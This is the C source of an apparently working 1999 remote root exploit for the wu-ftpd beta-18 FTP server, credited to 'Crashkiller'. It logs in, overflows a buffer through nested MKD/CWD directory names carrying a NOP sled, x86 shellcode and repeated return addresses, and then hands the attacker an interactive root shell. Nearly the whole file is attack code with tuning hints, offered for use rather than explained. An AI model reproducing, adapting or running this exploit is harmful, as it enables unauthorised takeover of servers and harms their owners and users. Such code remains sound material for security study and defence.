/*
     Ftpd Sploit '99 - PRIVATE CODE DO NOT DISTRIBUTE -=
        Coded By : Crashkiller ( pawq@kki.net.pl )
               Thx to : whole #hackingpl 
// Vulnerable Platforms : All With Wu-Ftpd-Beta-18(1) 

*/
/* Includes Here : */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>

#define bsize 250

char shellcode[] =
"\x89\xc3""\xb0\x17""\xcd\x80"                              
"\x31\xc0""\x89\xc3""\xb0\x2e""\xcd\x80""\x31\xc0"                              
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\xb0\x17\xcd\x80"
"\x31\xc0\x31\xdb\xb0\x2e\xcd\x80"
"\xeb\x4f\x31\xc0\x31\xc9\x5e\xb0\x27\x8d\x5e\x05\xfe\xc5\xb1\xed"
"\xcd\x80\x31\xc0\x8d\x5e\x05\xb0\x3d\xcd\x80\x31\xc0\xbb\xd2\xd1"
"\xd0\xff\xf7\xdb\x31\xc9\xb1\x10\x56\x01\xce\x89\x1e\x83\xc6\x03"
"\xe0\xf9\x5e\xb0\x3d\x8d\x5e\x10\xcd\x80\x31\xc0\x88\x46\x07\x89"
"\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd"
"\x80\xe8\xac\xff\xff\xff";



void Logo(void){
system("clear");
printf("\n+------------------------------------------+ \n");
printf(  "|      Wu-Ftpd Vulnerability Beta 18       | \n");
printf(  "|       Created By Crashkiller '99         | \n");
printf(  "+------------------------------------------+ \n");
printf(  "+-------   Please dont distribute it ------+ \n");
printf(  "+------------------------------------------+ \n\n");
}

  int pipe;

void makeit(char *co);
void mkd(char *dir);

void main(int argc,char *argv[])
{
  int sockdesk;
  fd_set readfds; /* Descriptors */
  int ret;
  char user[20];
  char password[20];
  char dir[20];
  char kom[bsize+4];
  char sockbuf[1024]; /* Buffer For Our Commands */
  struct sockaddr_in sckaddr; /* Strucktures For Connection Needed */
  long retaddr;
  struct hostent *h; 
  char *hostname;
  int offme=0,align=0;
  long ia;
        long *addr_ptr,addr;
        unsigned long sp;
        int i;
        Logo(); 
        if (argc<4) { 
printf("Usage : ./%s [IP or HOST] [user] [password] [directory] [offset] [align]\n",argv[0]);
printf(">>>>>> For Red Hats Use Offset 0 <<<<<<<<<<<<<<<\n");
printf("-= Offset from 100 to 6000  \n");
printf("-= Align 0 is for /incoming \n");
printf("-= If you got +w in /uploads then you use align 1 couse strlen(incoming)-strlen(/uploads)=1 \n");
printf("-= If you want to use it from user account then use a directory /tmp \n\n");

        exit(0);
        }
        hostname=argv[1];        
        bzero(user,sizeof(user));bzero(dir,sizeof(dir));
	bzero(password,sizeof(password));
        strncpy(user,argv[2],strlen(argv[2]));
	strncpy(password,argv[3],strlen(argv[3]));
	strncpy(dir,argv[4],strlen(argv[4]));
        if (argc>5) offme=atoi(argv[5]);
        if (argc>6) align=atoi(argv[6]);
        printf("------------------------------------\n");
	printf("-= Log User : %s                   \n",user);
	printf("-= Password : %s                   \n",password);
	printf("-= Directory: %s                   \n",dir);
	printf("-= Offset   : %d                   \n",offme);
	printf("-= Align    : %d                   \n",align);
        printf("------------------------------------\n");
        printf("Connecting To      : %s\n",hostname);
/* Lets make connection to the port and overflow in (first resolving)*/
    ia=inet_addr(hostname); 
        if (ia==-1)   
                if(h=gethostbyname(hostname)) memcpy(&ia,h->h_addr,4);
                                        else ia=-1;
        if (ia==-1)
        {
fprintf(stderr,"cannot resolve %s ! try connect to internet mothafucka\n",hostname);
                exit(0);
	}
	else {
  printf("Looks Good! Lets Try Attack!\n");
  }
  sckaddr.sin_family=AF_INET; 
  sckaddr.sin_addr.s_addr = ia; 
  sckaddr.sin_port=htons(21); 
 if ((pipe=socket(AF_INET,SOCK_STREAM,0))<0)   
      perror("Error opening the socket. \n");  
/* And Then Connect To Our Host/Ip */
if (connect(pipe,(struct sockaddr *) &sckaddr, sizeof(sckaddr)) < 0) {
    perror("Error : Somethink wrong with connecting.Port Closed? \n");
    printf("\n");
    exit(0);
}
printf("Connected To       : %s Succesfull\n",hostname);

/* Start Attack Proccess */
read(pipe,kom,sizeof(kom));
printf("WuFtpd - version: %s \n",kom);
/* Loggining into vikitm server */
    bzero(kom,sizeof(kom));
    sprintf(kom,"user %s\n",user);
    write(pipe,kom,strlen(kom));
    bzero(kom,sizeof(kom));
    sprintf(kom,"pass %s\n",password);
    write(pipe,kom,strlen(kom));
    bzero(kom,sizeof(kom));
    sprintf(kom,"cwd %s\n",dir);
    write(pipe,kom,strlen(kom));

for (i=0;i<=bsize;i++){
kom[i]=0x90;
}
getchar();
makeit(kom);
makeit(kom);
makeit(kom);
memset(kom,0x0,bsize);
    strcpy(kom,shellcode);
    makeit(kom);
memset(kom,0x0,bsize);
strcpy(kom,"bin");
makeit(kom);
memset(kom,0x0,bsize);
strcpy(kom,"sh");
makeit(kom);
strcpy(kom,"mkd sh\r\n");
write(pipe,kom,strlen(kom));
memset(kom,0x0,bsize);

retaddr=0xbffff13d-offme;
for (i=0;i<=align;i++) kom[i]='A';
for(i=align; i<bsize-40; i+=4)
                *(long *)&kom[i] = retaddr;

makeit(kom);
makeit(kom);
makeit(kom);
strcpy(sockbuf,"cd /;uname -a; id\n");
fprintf(stderr,"Sockbuf : %s ",sockbuf);
write(pipe,sockbuf,strlen(sockbuf));
bzero(sockbuf,sizeof(sockbuf));
while (1)
    {
      FD_ZERO (&readfds);
      FD_SET (0, &readfds);
      FD_SET (pipe, &readfds);
      select (255, &readfds, NULL, NULL, NULL);
      if (FD_ISSET (pipe, &readfds))
        {
          memset (sockbuf, 0, 1024);
          ret = read (pipe, sockbuf, 1024);
          if (ret <= 0)
            {
              printf ("Connection closed by foreign host.\n");
              exit (-1);
            }
          printf ("%s", sockbuf);
        }
      if (FD_ISSET (0, &readfds))
        {
          memset (sockbuf, 0, 1024);
          read (0, sockbuf, 1024);
          write (pipe, sockbuf, strlen(sockbuf));
        }
    }
close(pipe); 
}

void makeit(char *co){
  char buf[bsize+4+30];
  char tmpbuf[bsize+4+29];
  char kom[10];
  char *ptr;
  int c;
bzero(buf,sizeof(buf));
bzero(tmpbuf,sizeof(tmpbuf));
ptr=tmpbuf;
for (c=0;c<=strlen(co);c++) {
if (co[c]=='\xff') *(ptr++)='\xff'; 
*(ptr++)=co[c];
}
  
memset(buf,0x0,bsize+34);
sprintf(buf,"mkd %s",tmpbuf);
buf[bsize-1]='\n';
if (write(pipe,buf,strlen(buf))!=strlen(buf)) {
printf("\n Write Failed !!!!! \n");
close(pipe); 
exit(0); 
}
strcpy(kom,"\r\n");
write(pipe,kom,strlen(kom));
memcpy(buf,"cwd ",4);
if (write(pipe,buf,strlen(buf))!=strlen(buf)) {
printf("\n Write Failed !!!!! \n");
close(pipe); 
exit(0); 
}
write(pipe,kom,strlen(kom));
}

